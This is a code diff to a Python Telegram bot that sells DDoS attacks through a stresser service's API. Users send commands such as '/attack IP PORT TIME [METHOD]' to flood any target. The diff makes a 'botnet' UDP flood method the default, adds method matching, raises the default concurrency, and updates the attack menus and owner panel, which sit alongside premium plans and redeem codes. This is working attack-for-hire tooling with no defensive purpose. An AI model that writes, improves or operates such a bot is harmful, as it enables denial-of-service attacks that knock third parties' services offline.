@@ -35,17 +35,31 @@ MAX_DURATION = 80
 RATE_LIMIT_SECONDS = 10
 
 # ===== ATTACK METHODS =====
-ATTACK_METHODS = ["UDP-BIG", "UDP-Gbps"]
+# Default method is UDP-Gbps (botnet). UDP-BIG is the backup.
+ATTACK_METHODS = ["UDP-Gbps", "UDP-BIG"]
+DEFAULT_METHOD = "UDP-Gbps"
 
 METHOD_CONCURRENT = {
-    "UDP-BIG": 4,
     "UDP-Gbps": 2,
+    "UDP-BIG": 4,
 }
 
 METHOD_ENDPOINT = {
-    "UDP-BIG": "/api/start",
     "UDP-Gbps": "/api/botnet/start",
+    "UDP-BIG": "/api/start",
 }
+
+
+def resolve_method(raw):
+    """Case-insensitive method matching. Returns canonical name or None."""
+    if not raw:
+        return None
+    r = raw.strip().lower()
+    for m in ATTACK_METHODS:
+        if m.lower() == r:
+            return m
+    return None
+
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -630,7 +644,7 @@ async def send_api_attack(target, port, duration, method):
         "Connection": "keep-alive",
     }
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
-    conc = METHOD_CONCURRENT.get(method, 1)
+    conc = METHOD_CONCURRENT.get(method, 2)
 
     logger.info(f"🚀 {method} → {target}:{port} for {duration}s ({conc}c)")
     logger.info(f"🔗 URL: {url}")
@@ -648,10 +662,6 @@ async def send_api_attack(target, port, duration, method):
                 except Exception:
                     data = {"raw": text[:200]}
 
-                # Success if:
-                # - HTTP 200 AND
-                # - (ok is True) OR (success is True) OR (status is success) OR
-                #   ("Attack started" / "successfully launched" in message)
                 ok = False
                 if resp.status == 200 and isinstance(data, dict):
                     if data.get('ok') is True:
@@ -738,7 +748,7 @@ class AttackManager:
                 'start_time': datetime.now(),
                 'duration': duration,
                 'method': method,
-                'concurrent': METHOD_CONCURRENT.get(method, 1),
+                'concurrent': METHOD_CONCURRENT.get(method, 2),
                 'task': None,
             }
             task = asyncio.create_task(
@@ -765,7 +775,7 @@ class AttackManager:
 
     async def execute_attack(self, attack_id, target, port, duration,
                              user_id, context, method):
-        concurrent = METHOD_CONCURRENT.get(method, 1)
+        concurrent = METHOD_CONCURRENT.get(method, 2)
         start = time.time()
 
         try:
@@ -936,8 +946,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Plan: {plan_display}\n"
         f"⚡ Status: {active_text}\n\n"
         f"📡 *Methods:*\n"
-        f"• UDP-BIG (4c)\n"
-        f"• UDP-Gbps (2c)\n\n"
+        f"• UDP-Gbps (2c) ⭐ default\n"
+        f"• UDP-BIG (4c) backup\n\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME [METHOD]'}"
     )
@@ -967,10 +977,10 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
             "Examples:\n"
-            "`/attack 1.2.3.4 80 60` (UDP-BIG, 4c)\n"
-            "`/attack 1.2.3.4 80 60 UDP-Gbps` (2c)\n\n"
+            "`/attack 1.2.3.4 80 60` (default: UDP-Gbps, 2c)\n"
+            "`/attack 1.2.3.4 80 60 UDP-BIG` (4c)\n\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION}s\n"
-            "📡 Methods: UDP-BIG (4c), UDP-Gbps (2c)",
+            "📡 Methods: UDP-Gbps (2c), UDP-BIG (4c)",
             parse_mode='Markdown',
         )
         return
@@ -979,9 +989,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = args[0]
         port = int(args[1])
         duration = int(args[2])
-        method = args[3].upper() if len(args) > 3 else "UDP-BIG"
-        if method not in ATTACK_METHODS:
-            method = "UDP-BIG"
+
+        method = DEFAULT_METHOD
+        if len(args) > 3:
+            resolved = resolve_method(args[3])
+            if resolved:
+                method = resolved
 
         if duration < MIN_DURATION or duration > MAX_DURATION:
             await update.message.reply_text(
@@ -1039,7 +1052,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     args = context.args
-    method = "UDP-BIG"
+    method = DEFAULT_METHOD
     host = "1.1.1.1"
     port = 80
     if args and len(args) >= 2:
@@ -1048,8 +1061,10 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             port = int(args[1])
         except ValueError:
             port = 80
-        if len(args) > 2 and args[2].upper() in ATTACK_METHODS:
-            method = args[2].upper()
+        if len(args) > 2:
+            resolved = resolve_method(args[2])
+            if resolved:
+                method = resolved
 
     msg = await update.message.reply_text(
         f"🔬 Testing `{method}` on `{host}:{port}`…",
@@ -1083,7 +1098,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active Attacks: **{stats['active_attacks']}**\n"
         f"👥 Users: {len(users)}\n"
         f"💥 Total Attacks: {stats['total_attacks']}\n"
-        f"📡 Methods: UDP-BIG (4c), UDP-Gbps (2c)",
+        f"📡 Methods: UDP-Gbps (2c, default), UDP-BIG (4c)",
         parse_mode='Markdown',
     )
 
@@ -1189,14 +1204,14 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     keyboard = [
-        [InlineKeyboardButton("💥 UDP-BIG (4c)", callback_data="method_UDP-BIG")],
-        [InlineKeyboardButton("🚀 UDP-Gbps (2c)", callback_data="method_UDP-Gbps")],
+        [InlineKeyboardButton("🚀 UDP-Gbps (2c) ⭐ DEFAULT", callback_data="method_UDP-Gbps")],
+        [InlineKeyboardButton("💥 UDP-BIG (4c) BACKUP", callback_data="method_UDP-BIG")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")],
     ]
     await query.edit_message_text(
         "💥 *Select method*\n\n"
-        "• **UDP-BIG** — normal (4 concurrent)\n"
-        "• **UDP-Gbps** — botnet (2 concurrent)\n\n"
+        "⭐ **UDP-Gbps** — botnet (2 concurrent) DEFAULT\n"
+        "💥 **UDP-BIG** — normal (4 concurrent) BACKUP\n\n"
         "After selecting, send: `IP PORT TIME`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown',
@@ -1208,10 +1223,13 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     method = query.data.replace('method_', '')
-    context.user_data['attack_method'] = method
-    conc = METHOD_CONCURRENT.get(method, 1)
+    resolved = resolve_method(method)
+    if not resolved:
+        resolved = DEFAULT_METHOD
+    context.user_data['attack_method'] = resolved
+    conc = METHOD_CONCURRENT.get(resolved, 2)
     await query.edit_message_text(
-        f"📡 *Method: {method}* ({conc}c)\n\n"
+        f"📡 *Method: {resolved}* ({conc}c)\n\n"
         f"Send: `IP PORT TIME`\n"
         f"Example: `8.8.8.8 80 60`\n\n"
         f"⏱️ {MIN_DURATION}-{MAX_DURATION}s\n"
@@ -1230,7 +1248,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if plan == "free" and not is_owner:
         text = "👤 *MY PLAN*\n\n📊 Plan: 🆓 FREE\n\n💡 `/redeem CODE` to upgrade."
     elif is_owner:
-        text = "👑 *OWNER ACCESS*\n\n📊 Plan: 💎 PREMIUM\n📡 UDP-BIG (4c) · UDP-Gbps (2c)"
+        text = "👑 *OWNER ACCESS*\n\n📊 Plan: 💎 PREMIUM\n📡 UDP-Gbps (2c) · UDP-BIG (4c)"
     elif expiry:
         days_left = max(0, (expiry - datetime.now()).days)
         text = (f"👤 *MY PLAN*\n\n📊 Plan: 💎 PREMIUM\n"
@@ -1614,7 +1632,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 *OWNER PANEL*\n\n"
         f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
         f"⚡ Active Attacks: {stats['active_attacks']}\n"
-        f"📡 Methods: UDP-BIG (4c), UDP-Gbps (2c)",
+        f"📡 Methods: UDP-Gbps (2c, default), UDP-BIG (4c)",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown',
     )
@@ -1924,14 +1942,14 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not API_TOKEN:
         await query.edit_message_text("❌ API_TOKEN missing in .env")
         return
-    r = await send_api_attack("1.1.1.1", 80, 10, "UDP-BIG")
+    r = await send_api_attack("1.1.1.1", 80, 10, DEFAULT_METHOD)
     if r.get("success"):
-        text = (f"✅ API OK\n\n"
+        text = (f"✅ API OK (default method: {DEFAULT_METHOD})\n\n"
                 f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
                 f"Attack ID: `{r.get('attack_id')}`\n"
                 f"Raw: `{str(r.get('response'))[:150]}`")
     else:
-        text = (f"❌ API FAILED\n\n"
+        text = (f"❌ API FAILED (default method: {DEFAULT_METHOD})\n\n"
                 f"Error: `{r.get('error')}`\n"
                 f"Raw: `{str(r.get('response'))[:150]}`")
     await query.edit_message_text(
@@ -1986,12 +2004,31 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if update.message.text.lower() == '/cancel':
         context.user_data['awaiting_attack'] = False
+        context.user_data.pop('attack_method', None)
         await update.message.reply_text("✅ Cancelled.")
         return
-    args = update.message.text.split()
-    context.args = args
+
+    parts = update.message.text.split()
+    saved_method = context.user_data.get('attack_method')
+
+    if len(parts) == 3 and saved_method:
+        # User chose via menu then typed just IP PORT TIME
+        parts.append(saved_method)
+    elif len(parts) >= 4 and saved_method:
+        # If they typed a method, respect it (override menu)
+        resolved = resolve_method(parts[3])
+        if resolved:
+            parts[3] = resolved
+        else:
+            parts[3] = saved_method
+    elif len(parts) == 3:
+        # Fall back to DEFAULT_METHOD (UDP-Gbps)
+        parts.append(DEFAULT_METHOD)
+
+    context.args = parts
     await attack_command(update, context)
     context.user_data['awaiting_attack'] = False
+    context.user_data.pop('attack_method', None)
 
 
 # ===== MAIN =====
@@ -2005,9 +2042,10 @@ def main():
     print("=" * 60)
     print("🔥 GURU ATTACK BOT — stresser.works API")
     print("=" * 60)
+    print(f"Default method: {DEFAULT_METHOD} (2 concurrent)")
     print("Methods:")
-    print("  UDP-BIG   → /api/start         (4 concurrent)")
-    print("  UDP-Gbps  → /api/botnet/start  (2 concurrent)")
+    print("  UDP-Gbps  → /api/botnet/start  (2 concurrent) DEFAULT")
+    print("  UDP-BIG   → /api/start         (4 concurrent) BACKUP")
     print("=" * 60)
 
     bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
